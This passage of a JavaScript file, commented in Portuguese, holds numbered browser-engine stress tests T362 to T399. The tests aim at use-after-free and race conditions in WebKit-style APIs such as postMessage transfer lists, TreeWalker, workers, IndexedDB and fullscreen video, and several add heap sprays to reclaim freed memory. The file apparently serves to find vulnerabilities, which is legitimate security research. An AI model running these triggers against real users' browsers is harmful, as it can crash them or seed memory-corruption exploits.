        get port() { return p1; }
    };
    
    // O array de transferência é acessado pelo algoritmo de clonagem estruturada
    // Se conseguirmos fechar a porta DEPOIS da validação mas ANTES da serialização...
    Object.defineProperty(poison, "transferList", {
        get: function() {
            p1.close();
            // Spray para reusar memória da porta
            var spray = new Uint32Array(128).fill(0xDEADBEEF);
            return [p1];
        }
    });

    try {
        window.postMessage(poison.port, "*", poison.transferList);
    } catch(e) {
        log(">> T362 Blocked: " + e.message);
    }
}

function runTest363() {
    log("Iniciando T363: DOM Tree Walker Filter Removal UAF...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span>A</span><b>B</b><i>C</i></div>".repeat(50);
    document.body.appendChild(root);
    
    var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if (node.tagName === 'B') {
                // Remove o nó atual durante a filtragem
                // O TreeWalker mantém um ponteiro interno para 'currentNode'
                if(node.parentNode) node.parentNode.removeChild(node);
                // Força GC/Reuse
                var div = document.createElement('div');
                div.textContent = "REPLACE";
                root.appendChild(div);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    }, false);
    
    try {
        // Navegação deve tentar acessar o nó removido para encontrar o próximo irmão
        while(tw.nextNode()) {}
    } catch(e) {}
    
    setTimeout(() => {
        if(document.body.contains(root)) document.body.removeChild(root);
        log(">> T363: Walker logic done.");
    }, 1000);
}

function runTest364() {
    log("Iniciando T364: RegExp Compile Cache Flush Race...");
    var re = /abc/g;
    var str = "abc".repeat(5000);
    
    var t = setInterval(function() {
        // Executa regex
        re.exec(str);
        
        // Tenta invalidar o bytecode compilado do regex
        // Engines compilam regex quentes para código nativo (JIT-like behavior mesmo sem JIT JS total)
        // Alterar source ou flags força recompilação
        var r2 = new RegExp(re.source, (Math.random() > 0.5 ? "g" : "gi"));
        r2.exec(str);
        
        // Tenta causar pressão de memória para limpar cache de código
        var junk = new Array(1000).fill(1);
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T364: RegExp cache stress stopped.");
    }, 2000);
}

function runTest365() {
    log("Iniciando T365: Cyclic Proxy History Serialization...");
    // Cria um Proxy que retorna a si mesmo em qualquer acesso
    var p = new Proxy({}, {
        get: function(t, k) { return p; }
    });
    
    try {
        // Tenta empurrar o proxy recursivo infinito para o histórico
        // O algoritmo de Structured Clone deve detectar ciclos, mas Proxies podem confundir a detecção
        history.pushState(p, "Proxy", "/proxy_crash");
        
        // Se passar, força reload para tentar deserializar o caos
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        f.contentWindow.history.replaceState(p, "P", "/p");
        f.contentWindow.location.reload();
        setTimeout(() => document.body.removeChild(f), 500);
    } catch(e) {
        log(">> T365 Serialization Error: " + e.message);
    }
}

function runTest366() {
    log("Iniciando T366: Crypto Worker Buffer Detach Race...");
    if (!window.crypto) { log("N/A"); return; }
    
    var ab = new ArrayBuffer(1024 * 1024 * 4); // 4MB
    var view = new Uint8Array(ab);
    
    var b = new Blob([`
        self.onmessage = function(e) {
            var v = new Uint8Array(e.data);
            // Syscall pesada
            crypto.getRandomValues(v);
            postMessage('done');
        }
    `], {type:'js'});
    
    var w = new Worker(URL.createObjectURL(b));
    
    try {
        // Envia buffer (transferable) para worker iniciar escrita
        w.postMessage(ab, [ab]);
        
        // Imediatamente mata o worker. 
        // O Kernel está escrevendo em pages que pertenciam ao worker.
        // Ao morrer, as pages são liberadas? Se o DMA do crypto continuar -> Panic.
        setTimeout(() => w.terminate(), 0);
        
        // Tenta realocar imediatamente na main thread
        var reclaim = new Uint32Array(1024*1024).fill(0xCAFEBABE);
    } catch(e) {}
    
    log(">> T366: Crypto DMA race triggered.");
}

function runTest367() {
    log("Iniciando T367: IndexedDB Version Change Blocked Kill...");
    var dbName = "blocked_" + Date.now();
    
    // Abre conexão inicial
    var r1 = indexedDB.open(dbName, 1);
    r1.onsuccess = function(e) {
        var db1 = e.target.result;
        
        // Worker tenta abrir versão maior (bloqueado por db1)
        var code = `
            var r = indexedDB.open("${dbName}", 2);
            r.onblocked = function(){ postMessage("blocked"); };
            r.onupgradeneeded = function(){ postMessage("upgrade"); };
        `;
        var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
        
        w.onmessage = function(msg) {
            if(msg.data === "blocked") {
                // Worker está esperando. Fechamos db1 abruptamente e matamos worker simultaneamente
                db1.close(); 
                // Race: O evento 'versionchange' tenta disparar no worker enquanto ele morre
                w.terminate();
            }
        };
    };
    
    log(">> T367: IDB locking race.");
}

function runTest368() {
    log("Iniciando T368: Fullscreen Video Track Cue Flush...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    reqFS(v);
    
    var interval = setInterval(function() {
        // Adiciona cues massivamente
        for(var i=0; i<100; i++) {
            t.addCue(new VTTCue(i, i+1, "X".repeat(100)));
        }
        
        // Remove faixa inteira forçando limpeza de memória do overlay
        v.textTracks[0].mode = "disabled";
        
        // Readiciona faixa
        t = v.addTextTrack("captions");
        t.mode = "showing";
        
        // Alterna display do vídeo para forçar re-attach do surface
        v.style.display = "none";
        v.offsetHeight;
        v.style.display = "block";
        
    }, 50);
    
    setTimeout(function() {
        clearInterval(interval);
        exitFS();
        document.body.removeChild(v);
        log(">> T368: Overlay flush done.");
    }, 3000);
}

function runTest369() {
    log("Iniciando T369: File Reader Sync Blob Revoke Deadlock...");
    var data = new Uint8Array(1024*1024*5).fill(65); // 5MB
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    var code = `
        self.onmessage = function(u) {
            var x = new XMLHttpRequest();
            x.open('GET', u, false); // Bloqueante
            try { x.send(); } catch(e){}
            postMessage('done');
        }
    `;
    var w = new Worker(URL.createObjectURL(new Blob([code], {type:'js'})));
    
    // Worker começa leitura síncrona
    w.postMessage(url);
    
    // Main thread tenta revogar a URL enquanto worker lê
    // Pode causar deadlock se o lock do recurso for global
    setTimeout(function() {
        URL.revokeObjectURL(url);
        // Destrói blob original
        blob = null; 
        data = null;
        // Tenta alocar memória para forçar pagining
        var junk = new ArrayBuffer(1024*1024*10);
    }, 10); // Janela crítica pequena
    
    setTimeout(() => w.terminate(), 2000);
    log(">> T369: Sync IO Race.");
}

function runTest370() {
    log("Iniciando T370: THE OMEGA SINGULARITY (FINAL)...");
    
    // 1. Worker Transfer Loop
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen Media
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    var cycles = 0;
    var t = setInterval(function() {
        cycles++;
        
        // Transfer Memory
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Video Source & Revoke
        var b = new Blob(["junk"+cycles]);
        var u = URL.createObjectURL(b);
        v.src = u;
        if(cycles%3===0) URL.revokeObjectURL(u);
        
        // Fullscreen Toggle & History
        if(cycles%10===0) {
            reqFS(v);
            history.pushState({}, "x", "/"+cycles);
        }
        if(cycles%10===5) {
            exitFS();
            // Iframe injection
            var f = document.createElement('iframe');
            document.body.appendChild(f);
            setTimeout(()=>document.body.removeChild(f), 50);
        }
        
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        if(document.body.contains(v)) document.body.removeChild(v);
        log(">> T370: Singularity collapsed. End of Line.");
    }, 5000);
}
function runTest371() {
    log("Iniciando T371: History State Proxy GC Trap...");
    // Cria um Proxy que aloca memória massiva quando o serializador tenta ler propriedades
    // O objetivo é disparar o Garbage Collector no meio da clonagem estruturada
    var handler = {
        get: function(target, prop) {
            if (prop === "trap") {
                // Aloca lixo para forçar GC
                var junk = new Array(20000).fill("MEMORY_PRESSURE");
                // Modifica o objeto original
                target.b = null;
                return "trapped";
            }
            return target[prop];
        }
    };
    
    var obj = { a: 1, b: { c: 2 }, trap: 3 };
    var p = new Proxy(obj, handler);
    
    try {
        history.pushState(p, "ProxyTrap", "/trap");
        // Força navegação para deserializar
        history.go(0);
    } catch(e) {
        log(">> T371 Serialization: " + e.message);
    }
}

function runTest372() {
    log("Iniciando T372: Range Selection Mutation UAF...");
    var div = document.createElement('div');
    div.innerHTML = "<b>Start</b><span>Middle</span><i>End</i>";
    document.body.appendChild(div);
    
    var r = document.createRange();
    var sel = window.getSelection();
    r.setStart(div.firstChild, 0);
    r.setEnd(div.lastChild, 0);
    sel.addRange(r);
    
    // Callback síncrono de remoção
    div.addEventListener('DOMNodeRemoved', function(e) {
        if(e.target.tagName === 'SPAN') {
            // Enquanto o SPAN é removido, tentamos manipular a seleção que o engloba
            sel.removeAllRanges();
            var r2 = document.createRange();
            // Tenta selecionar o nó que está morrendo
            try { r2.selectNode(e.target); } catch(z){}
            sel.addRange(r2);
            
            // Spray de memória
            var s = new Uint32Array(100).fill(0xDEADBEEF);
        }
    });
    
    try {
        div.removeChild(div.querySelector('span'));
    } catch(e) {}
    
    setTimeout(() => {
        if(document.body.contains(div)) document.body.removeChild(div);
        log(">> T372: Range UAF logic executed.");
    }, 1000);
}

function runTest373() {
    log("Iniciando T373: DataView Transfer Getter Poison...");
    var ab = new ArrayBuffer(1024);
    var view = new DataView(ab);
    view.setUint8(0, 0xAA);
    
    var obj = {
        get buffer() {
            // Getter chamado durante a serialização
            // Retorna o buffer para ser transferido
            return ab;
        }
    };
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    try {
        // Envia estrutura onde o getter é invocado. 
        // Se a engine ler a view antes de transferir o buffer, ok.
        // Se transferir o buffer e depois tentar ler propriedades da view associada...
        w.postMessage({ view: view, buf: obj.buffer }, [ab]);
        
        // Tenta acessar a view localmente pós-envio
        var v = view.getUint8(0);
        log("!! T373: Accessed detached view: " + v);
    } catch(e) {
        log(">> T373 Check: " + e.message);
    }
    w.terminate();
}

function runTest374() {
    log("Iniciando T374: RegExp Exec Rope Flattening Race...");
    // Cria uma string "Rope" (concatenada, não plana)
    var s1 = "AAAA".repeat(1000);
    var s2 = "BBBB".repeat(1000);
    var rope = s1 + s2;
    
    var re = /B/g;
    re.lastIndex = 3900; // Perto da fronteira da concatenação
    
    // Objeto que tenta invalidar a string durante a execução
    var o = {
        toString: function() {
            // Força GC pesado
            var a = [];
            for(var i=0; i<10000; i++) a.push({});
            return rope;
        }
    };
    
    try {
        // Exec força achatamento (flattening) da rope.
        // Se o GC rodar durante a alocação do buffer plano e mover a memória...
        re.exec(o);
    } catch(e) {}
    
    log(">> T374: Rope flattening stress.");
}

function runTest375() {
    log("Iniciando T375: Message Port Self-Transfer Loop...");
    var ch = new MessageChannel();
    var p1 = ch.port1;
    
    var w = new Worker(URL.createObjectURL(new Blob([`
        self.onmessage = function(e) {
            var p = e.data;
            try {
                // Tenta enviar a porta para si mesma
                p.postMessage(p, [p]);
            } catch(z) {}
        }
    `], {type:'js'})));
    
    try {
        w.postMessage(p1, [p1]);
    } catch(e) {}
    
    setTimeout(() => w.terminate(), 2000);
    log(">> T375: Port recursion sent.");
}

function runTest376() {
    log("Iniciando T376: Crypto Large Buffer Terminate...");
    if(!window.crypto) { log("N/A"); return; }
    
    // Buffer grande para garantir que a syscall leve tempo
    var b = new Blob([`
        self.onmessage = function() {
            var buf = new Uint8Array(1024 * 1024 * 8); // 8MB
            crypto.getRandomValues(buf);
            postMessage("done");
        }
    `], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("go");
        
        // Mata o worker instantaneamente. 
        // O Kernel estará escrevendo aleatoriedade na memória virtual do worker.
        w.terminate();
        
        // Tenta realocar a memória liberada imediatamente
        var spray = new Uint32Array(1024 * 1024 * 2).fill(0xCAFEBABE);
    }, 25);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T376: Crypto syscall race done.");
    }, 3000);
}

function runTest377() {
    log("Iniciando T377: Blob URL Sync XHR Revoke Race...");
    var data = new Uint8Array(1024*1024*2).fill(65);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    
    // Tenta criar uma condição de corrida no File Descriptor do Blob
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false); // Síncrono
    
    // Define um timer para revogar a URL "durante" a leitura se o thread scheduling permitir
    // ou se o XHR síncrono liberar a thread principal brevemente (não deve, mas testamos falhas)
    setTimeout(() => URL.revokeObjectURL(url), 0);
    
    try {
        xhr.send();
        log(">> T377: Sync read complete (Size: " + xhr.response.byteLength + ")");
    } catch(e) {
        log(">> T377 Error: " + e.message);
    }
    
    // Limpeza
    URL.revokeObjectURL(url);
}

function runTest378() {
    log("Iniciando T378: Fullscreen Video Detach Surface...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    reqFS(v);
    
    setTimeout(function() {
        // Remove o elemento do DOM
        if(v.parentNode) v.parentNode.removeChild(v);
        
        // Tenta trocar o SRC de um elemento órfão em tela cheia
        // O compositor de superfície (overlay) pode entrar em pânico
        v.src = "blob:null/invalid_source";
        try { v.load(); } catch(e){}
        
        // Sai do FS globalmente
        exitFS();
        
        // Spray para ocupar a memória da superfície de vídeo
        var s = new Uint32Array(1024*1024).fill(0x11223344);
        log(">> T378: Video surface detach logic.");
    }, 300);
}

function runTest379() {
    log("Iniciando T379: Storage Event IPC Flood...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var count = 0;
    var t = setInterval(function() {
        count++;
        // Gera eventos de storage massivos entre janelas
        // Isso estressa o sistema de IPC (Inter-Process Communication) do navegador
        localStorage.setItem("key" + count, "val" + Math.random());
        f.contentWindow.localStorage.setItem("key" + count, "frame" + Math.random());
        
        // Remove para causar churn no arquivo de DB
        if(count % 10 === 0) localStorage.clear();
        
        // Força sincronização visual
        var h = document.body.offsetHeight;
    }, 5);
    
    setTimeout(function() {
        clearInterval(t);
        document.body.removeChild(f);
        localStorage.clear();
        log(">> T379: Storage flood stopped.");
    }, 3000);
}

function runTest380() {
    log("Iniciando T380: THE ANNIHILATION (FULL COMBO)...");
    
    // 1. Worker Allocation & Transfer
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Video Fullscreen Toggle
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    // 3. Iframe History Nav
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        
        // Memory Churn
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Visual Churn
        if(i % 10 === 0) reqFS(v);
        if(i % 10 === 5) exitFS();
        
        // History/Doc Churn
        f.src = "about:blank";
        try { history.replaceState({}, "x", "/"+i); } catch(e){}
        
        // IO Churn
        if(i % 20 === 0) localStorage.setItem("bomb", "A".repeat(10000));
        
    }, 30);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        document.body.removeChild(v);
        document.body.removeChild(f);
        localStorage.clear();
        log(">> T380: Annihilation complete.");
    }, 5000);
}
function runTest381() {
    log("Iniciando T381: TypedArray Constructor Species Proxy...");
    // Intercepta a criação de novas views derivadas para retornar buffers desconectados
    var P = new Proxy(Uint8Array, {
        get: function(target, prop) {
            if (prop === Symbol.species) return function() {
                // Retorna um objeto que finge ser um TypedArray mas tem buffer nulo/pequeno
                return { 
                    buffer: new ArrayBuffer(0), 
                    byteOffset: 0, 
                    length: 0xFFFFFFFF, // Length falso para tentar OOB
                    set: function() {} 
                };
            };
            return target[prop];
        }
    });

    try {
        var a = new Uint8Array([1, 2, 3]);
        Object.setPrototypeOf(a, P.prototype);
        a.constructor = P;
        // map chama SpeciesConstructor. Se o motor não verificar o buffer retornado...
        a.map(x => x); 
        log(">> T381: Species proxy executed.");
    } catch(e) {
        log(">> T381 Error: " + e.message);
    }
}

function runTest382() {
    log("Iniciando T382: History State Cyclic Getter Flood...");
    var obj = {};
    // Cria referência circular protegida por getter que aloca memória
    Object.defineProperty(obj, "cycle", {
        get: function() {
            var junk = new Array(5000).fill("PRESSURE");
            return obj; // Retorna a si mesmo
        }
    });

    try {
        // Structured Clone deve detectar ciclos, mas o getter roda durante a travessia
        history.pushState(obj, "Cycle", "/cycle");
        // Força navegação para disparar deserialização
        history.go(0);
    } catch(e) {
        log(">> T382 State: " + e.message);
    }
}

function runTest383() {
    log("Iniciando T383: Mutation Observer Detached Node Access...");
    var div = document.createElement('div');
    var span = document.createElement('span');
    div.appendChild(span);
    document.body.appendChild(div);

    var mo = new MutationObserver(function(mutations) {
        // Callback roda no final do microtask
        // Removemos o elemento pai
        if(div.parentNode) div.parentNode.removeChild(div);
        
        // Tentamos acessar propriedades de layout do filho desconectado
        // Isso força recálculo de estilo em uma árvore sem root
        var h = span.getBoundingClientRect();
        
        // Heap spray
        var s = new Float64Array(1000).fill(1.1);
    });

    mo.observe(div, { childList: true, subtree: true });
    
    // Dispara mutação
    span.textContent = "MUTATE";
    
    setTimeout(() => {
        mo.disconnect();
        log(">> T383: MO detach logic done.");
    }, 1000);
}

function runTest384() {
    log("Iniciando T384: RegExp LastIndex Worker Desync...");
    var re = /a/g;
    // Transfere RegExp para worker (clonagem estruturada)
    var w = new Worker(URL.createObjectURL(new Blob([`
        self.onmessage = function(e) {
            var r = e.data;
            // Loop de execução em thread separada
            var s = "a".repeat(1000);
            while(r.exec(s) !== null) {}
        }
    `], {type:'js'})));

    w.postMessage(re);

    // Modifica o objeto original na main thread. 
    // Se a implementação compartilhar estrutura interna (copy-on-write falho), causa race.
    var t = setInterval(() => {
        re.lastIndex = Math.floor(Math.random() * 100);
        re.compile("b"); // Força recompilação interna
    }, 1);

    setTimeout(() => {
        clearInterval(t);
        w.terminate();
        log(">> T384: RegExp threading done.");
    }, 2000);
}

function runTest385() {
    log("Iniciando T385: Message Port Transfer Neuter Trap...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    // Define um getter na lista de transferência
    // O WebKit valida a lista, mas se o getter modificar o array durante a iteração...
    var transferList = [p1];
    Object.defineProperty(transferList, 0, {
        get: function() {
            // Fecha a porta enquanto o validador tenta lê-la
            p1.close(); 
            return p1;
        }
    });

    try {
        w.postMessage("trap", transferList);
    } catch(e) {
        log(">> T385 Blocked: " + e.message);
    }
    w.terminate();
}

function runTest386() {
    log("Iniciando T386: Crypto Random Thread Termination...");
    if(!window.crypto) { log("N/A"); return; }
    
    var b = new Blob([`
        self.onmessage = function() {
            // Aloca buffer grande alinhado
            var buf = new Uint8Array(1024 * 1024 * 4); 
            // Syscall bloqueante de entropia
            crypto.getRandomValues(buf);
            postMessage("done");
        }
    `], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("go");
        // Termina worker instantaneamente para interromper a syscall
        w.terminate();
        // Tenta realocar a memória liberada pelo worker
        var spray = new Uint32Array(1024 * 256).fill(0xCAFEBABE);
    }, 30);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T386: Crypto race loop stopped.");
    }, 3000);
}

function runTest387() {
    log("Iniciando T387: IndexedDB Transaction Nav Lock...");
    var dbName = "nav_" + Date.now();
    var req = indexedDB.open(dbName, 1);
    
    req.onupgradeneeded = function(e) {
        var db = e.target.result;
        db.createObjectStore("store");
        
        // Inicia transação de escrita (lock no DB)
        var tx = e.target.transaction;
        var store = tx.objectStore("store");
        store.put("lock", "k");
        
        // Tenta navegar a página via Iframe enquanto a transação está ativa e pendente
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        f.contentWindow.location.reload();
        
        // Aborta transação no meio do unload do frame
        setTimeout(() => {
            try { tx.abort(); } catch(z){}
            document.body.removeChild(f);
        }, 10);
    };
    log(">> T387: IDB/Nav lock initiated.");
}

function runTest388() {
    log("Iniciando T388: Blob URL XHR Revocation Loop...");
    var data = new Uint8Array(1024*1024).fill(0xCC);
    
    var t = setInterval(function() {
        var b = new Blob([data]);
        var u = URL.createObjectURL(b);
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, true); // Assíncrono
        xhr.responseType = "arraybuffer";
        
        xhr.send();
        
        // Revoga imediatamente após o send, competindo com a thread de IO
        URL.revokeObjectURL(u);
        
        // Aloca lixo
        var junk = new ArrayBuffer(1024*100);
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T388: Blob/XHR race stopped.");
    }, 3000);
}

function runTest389() {
    log("Iniciando T389: LocalStorage Sync Write History Race...");
    var huge = "H".repeat(1024 * 64); // 64KB
    
    var t = setInterval(function() {
        try {
            // Escrita síncrona em disco
            localStorage.setItem("race", huge);
            
            // PushState força escrita de sessão
            history.pushState(null, null, "/race");
            
            // Remove e navega
            localStorage.removeItem("race");
            history.back();
        } catch(e) {
            localStorage.clear();
        }
    }, 15);
    
    setTimeout(function() {
        clearInterval(t);
        localStorage.clear();
        log(">> T389: Storage/History race stopped.");
    }, 3000);
}

function runTest390() {
    log("Iniciando T390: THE FINAL DESYNC (ALL VECTORS)...");
    
    // 1. Worker Buffer Detach
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){try{postMessage(e.data,[e.data]);}catch(z){}}"],{type:'js'})));
    var ab = new ArrayBuffer(1024*1024);
    
    // 2. Fullscreen Video
    var v = document.createElement('video');
    document.body.appendChild(v);
    
    // 3. Iframe Mutation
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    var i = 0;
    var t = setInterval(function() {
        i++;
        
        // Memory Churn
        try { w.postMessage(ab, [ab]); } catch(e) { ab = new ArrayBuffer(1024*1024); }
        
        // Visual Churn
        if (i % 10 === 0) reqFS(v);
        if (i % 10 === 5) exitFS();
        
        // DOM/IO Churn
        f.src = "about:blank";
        if (i % 20 === 0) localStorage.setItem("final", "DATA");
        
        // History Churn
        try { history.replaceState({}, "x", "/" + i); } catch(e){}
        
    }, 25);
    
    setTimeout(function() {
        clearInterval(t);
        w.terminate();
        exitFS();
        document.body.removeChild(v);
        document.body.removeChild(f);
        localStorage.clear();
        log(">> T390: Final sequence complete.");
    }, 5000);
}
function runTest391() {
    log("Iniciando T391: Transfer List Proxy Getter UAF...");
    var ab = new ArrayBuffer(1024 * 1024);
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){}"],{type:'js'})));
    
    var transferList = [ab, p1];
    var proxy = new Proxy(transferList, {
        get: function(target, prop) {
            if (prop === 'length') {
                return target.length;
            }
            if (prop === '0') {
                // Durante a leitura do primeiro item para transferência...
                // ...fechamos a porta que é o segundo item
                p1.close();
                // E tentamos neuterizar o buffer manualmente via outro worker se possivel, ou alocamos lixo
                var spray = new Uint32Array(1000).fill(0xDEADBEEF);
                return ab;
            }
            return target[prop];
        }
    });

    try {
        // O algoritmo de postMessage itera sobre transferList. 
        // Se a validação não for atômica, ele pode tentar transferir uma porta fechada/liberada.
        w.postMessage("trap", proxy);
    } catch(e) {
        log(">> T391 Blocked: " + e.message);
    }
    setTimeout(() => w.terminate(), 1000);
}

function runTest392() {
    log("Iniciando T392: Iframe Document Open History Race...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    
    f.onload = function() {
        var w = f.contentWindow;
        var d = f.contentDocument;
        
        // Push state para criar histórico
        w.history.pushState({}, "S1", "/s1");
        
        // Abre documento (limpa estado)
        d.open();
        d.write("<h1>Reset</h1>");
        
        // Enquanto o documento está "aberto" (parsing state), tentamos navegar
        // Isso cria conflito no DocumentLoader do WebKit
        setTimeout(() => {
            try { w.history.back(); } catch(e){}
            d.close();
            // Spray para corromper o loader antigo
            var spray = new Array(10000).fill("HISTORY");
        }, 0);
    };
    f.src = "about:blank";
    
    setTimeout(() => {
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T392: DocOpen race finished.");
    }, 2000);
}

function runTest393() {
    log("Iniciando T393: Tree Walker Mutation Removal Trap...");
    var root = document.createElement('div');
    root.innerHTML = "<b>A</b><i>B</i><u>C</u>".repeat(100);
    document.body.appendChild(root);
    
    var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if (node.tagName === 'I') {
                // Remove o nó atual durante a filtragem
                var next = node.nextSibling;
                if(next) root.removeChild(next); // Remove próximo
                root.removeChild(node); // Remove atual
                
                // Força layout síncrono
                var h = root.offsetHeight;
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    });
    
    try {
        while(tw.nextNode()) {
            // Acesso ao nó que acabou de ser removido pelo filtro?
            tw.currentNode.textContent = "DEAD";
        }
    } catch(e) {}
    
    setTimeout(() => {
        if(document.body.contains(root)) document.body.removeChild(root);
        log(">> T393: Walker trap done.");
    }, 1000);
}

function runTest394() {
    log("Iniciando T394: RegExp Subclass LastIndex Side-Effect...");
    class EvilRegExp extends RegExp {
        constructor(pattern) { super(pattern, 'g'); }
        // Intercepta leitura de lastIndex
        get lastIndex() {
            // Efeito colateral: Aloca memória e limpa caches
            var spray = new Float64Array(1000);
            return super.lastIndex;
        }
        set lastIndex(v) { super.lastIndex = v; }
    }
    
    var re = new EvilRegExp("a");
    var str = "a".repeat(5000);
    
    try {
        // String.prototype.replace usa lastIndex internamente em loop
        // Se a engine não cachear o valor e ler o getter repetidamente...
        str.replace(re, function(match) {
            // Modifica o regex no meio do replace
            re.compile("b"); 
            return "b";
        });
    } catch(e) {
        log(">> T394 Logic: " + e.message);
    }
}

function runTest395() {
    log("Iniciando T395: TypedArray Set Overlapping Buffer Detach...");
    var ab = new ArrayBuffer(1024);
    var ta = new Uint8Array(ab);
    var w = new Worker(URL.createObjectURL(new Blob(["self.onmessage=function(e){postMessage('ack');}"],{type:'js'})));
    
    // Objeto array-like que transfere o buffer quando lido
    var source = {
        length: 512,
        get 0() {
            // Transfere o buffer de destino 'ab' para o worker
            // Isso neuteriza 'ta' no meio da operação .set()
            w.postMessage(ab, [ab]);
            return 1;
        }
    };
    // Preenche o resto para ser iterável
    for(var i=1; i<512; i++) source[i] = i;
    
    try {
        // .set deve verificar se o buffer está detached. 
        // Se a verificação for feita apenas no início...
        ta.set(source);
    } catch(e) {}
    
    w.terminate();
    log(">> T395: Buffer detach during set.");
}

function runTest396() {
    log("Iniciando T396: Crypto Worker Buffer Alignment Kill...");
    if(!window.crypto) { log("N/A"); return; }
    
    // Cria buffer desalinhado (se possível) ou apenas muito grande
    var b = new Blob([`
        self.onmessage = function() {
            var buf = new Uint8Array(1024 * 1024 * 6); // 6MB
            // Inicia syscall
            crypto.getRandomValues(buf);
            postMessage("done");
        }
    `], {type:'js'});
    
    var t = setInterval(function() {
        var w = new Worker(URL.createObjectURL(b));
        w.postMessage("go");
        // Mata imediatamente. Se o driver crypto não tiver limpeza segura de thread cancelada...
        w.terminate();
        // Spray para ocupar o espaço de userland que o kernel estava escrevendo
        var s = new Uint32Array(1024*1024).fill(0xDEADC0DE);
    }, 40);
    
    setTimeout(() => { clearInterval(t); log(">> T396: Crypto kill stopped."); }, 3000);
}

function runTest397() {
    log("Iniciando T397: IndexedDB Version Change Handle Lock...");
    var dbName = "v_" + Date.now();
    var r1 = indexedDB.open(dbName, 1);
    
    r1.onsuccess = function(e) {
        var db = e.target.result;
        
        // Tenta abrir versão 2, disparando onversionchange em r1
        var r2 = indexedDB.open(dbName, 2);
        
        db.onversionchange = function() {
            // Em vez de fechar, fazemos operações pesadas
            // Isso bloqueia o upgrade e pode causar timeout/panic no gerenciador de lock do IDB
            var tx = db.transaction(db.objectStoreNames, "readonly"); // Erro se não houver stores, mas gera atividade
            
            // Cria worker e transfere algo para tentar escapar do contexto
            var w = new Worker(URL.createObjectURL(new Blob([""],{type:'js'})));
            w.terminate();
            
            // NÃO fecha o db
            // db.close(); 
        };
    };
    
    r1.onupgradeneeded = function(e) { e.target.result.createObjectStore("s"); };
    log(">> T397: Version locking race.");
}

function runTest398() {
    log("Iniciando T398: Video Track Cue Renderer Flush...");
    var v = document.createElement('video');
    document.body.appendChild(v);
    var t = v.addTextTrack("subtitles");
    t.mode = "showing";
    reqFS(v);
    
    var i = 0;
    var intv = setInterval(function() {
        i++;
        // Adiciona cue
        var c = new VTTCue(i, i+1, "F".repeat(500));
        t.addCue(c);
        
        // Remove track e recria
        if(i % 10 === 0) {
            v.textTracks[0].mode = "disabled";
            t = v.addTextTrack("captions");
            t.mode = "showing";
        }
        
        // Força repaint do overlay mudando tamanho do video em FS
        v.style.width = (100 + (i%5)) + "%";
        
        if(i > 100) {
            clearInterval(intv);
            exitFS();
            document.body.removeChild(v);
            log(">> T398: Overlay flush done.");
        }
    }, 20);
}

function runTest399() {
    log("Iniciando T399: XHR Sync Blob Descriptor Exhaustion...");
    var blobs = [];
    var urls = [];
    
    // Aloca muitos Blobs pequenos
    for(var i=0; i<500; i++) {
        blobs.push(new Blob([new Uint8Array(1024).fill(i)]));
        urls.push(URL.createObjectURL(blobs[i]));
    }
    
    var t = setInterval(function() {
        var u = urls[Math.floor(Math.random() * urls.length)];
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, false); // Sync
        try { xhr.send(); } catch(e){}
        
        // Revoga e recria para churn de file descriptors
        URL.revokeObjectURL(u);
        var nb = new Blob(["R"]);
        urls[Math.floor(Math.random() * urls.length)] = URL.createObjectURL(nb);
    }, 5);
    
    setTimeout(() => {
        clearInterval(t);
        urls.forEach(u => URL.revokeObjectURL(u));
        log(">> T399: FD exhaustion stop.");
    }, 3000);
}

function runTest400() {
